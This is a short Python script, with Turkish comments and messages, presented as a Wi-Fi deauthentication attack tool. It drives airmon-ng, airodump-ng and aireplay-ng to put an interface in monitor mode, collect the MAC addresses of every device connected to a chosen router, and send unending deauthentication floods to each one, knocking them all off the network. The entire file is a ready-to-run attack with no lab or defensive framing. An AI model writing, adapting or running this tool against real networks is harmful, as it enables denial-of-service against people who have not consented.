import subprocess
import re
import time

print("Wi-Fi Deauth Attack Script")
print("Bu script, belirtilen router'a bağlı tüm cihazların bağlantısını keser.")
print("Miraç Akkuş tarafından yazılmıştır.")

def get_networks(interface="wlan0mon"):
    """Ağdaki tüm cihazları tara"""
    print("[*] Ağ taranıyor... (10 saniye)")
    result = subprocess.run(
        ["airodump-ng", "--output-format", "csv", "-w", "/tmp/scan", interface],
        timeout=10, capture_output=True
    )

def parse_clients(csv_file="/tmp/scan-01.csv"):
    """CSV'den client MAC adreslerini çek"""
    clients = []
    in_clients = False
    
    with open(csv_file, "r", errors="ignore") as f:
        for line in f:
            if "Station MAC" in line:
                in_clients = True
                continue
            if in_clients:
                parts = line.strip().split(",")
                if len(parts) > 5 and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0].strip()):
                    clients.append(parts[0].strip())
    return clients

def deauth_all(router_mac, clients, interface="wlan0mon"):
    """Tüm cihazlara deauth gönder"""
    print(f"[*] {len(clients)} cihaz bulundu, bağlantıları kesiliyor...")
    
    for mac in clients:
        print(f"  [-] Kesiliyor: {mac}")
        subprocess.Popen([
            "aireplay-ng", "--deauth", "0",
            "-a", router_mac,
            "-c", mac,
            interface
        ])
        time.sleep(0.5)

def main():
    router_mac = input("Router MAC adresi: ").strip()
    interface = input("Arayüz (varsayılan wlan0mon): ").strip() or "wlan0mon"
    
    # Önce monitor moda geçecek ve daha rahat yapacak
    print("[*] Monitor moda geçiliyor...")
    subprocess.run(["airmon-ng", "start", "wlan0"])
    
    # Tarama yapacak
    get_networks(interface)
    
    # Client'ları parse et
    clients = parse_clients()
    
    if not clients:
        print("[!] Hiç cihaz bulunamadı.")
        return
    
    print(f"\n[+] Bulunan cihazlar:")
    for c in clients:
        print(f"  - {c}")
    
    confirm = input("\nTümünü kesmek istiyor musun? (e/h): ")
    if confirm.lower() == "e":
        deauth_all(router_mac, clients, interface)
    else:
        print("[!] İptal edildi.")

if __name__ == "__main__":
    main()
